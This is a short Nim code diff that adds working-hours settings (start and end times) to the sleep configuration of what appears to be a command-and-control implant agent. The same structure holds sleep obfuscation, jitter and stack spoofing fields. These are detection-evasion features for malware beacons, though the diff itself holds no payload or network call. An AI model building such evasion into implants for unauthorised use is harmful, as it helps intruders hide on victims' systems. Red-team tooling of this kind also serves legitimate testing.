@@ -311,11 +311,19 @@ type
         profile*: Profile
         client*: WsConnection
 
+    WorkingHours* = ref object 
+        enabled*: bool
+        startHour*: int32 
+        startMinute*: int32
+        endHour*: int32
+        endMinute*: int32
+
     SleepSettings* = ref object 
         sleepDelay*: uint32
         jitter*: uint32
         sleepTechnique*: SleepObfuscationTechnique
         spoofStack*: bool
+        workingHours*: WorkingHours
 
     AgentCtx* = ref object
         agentId*: string
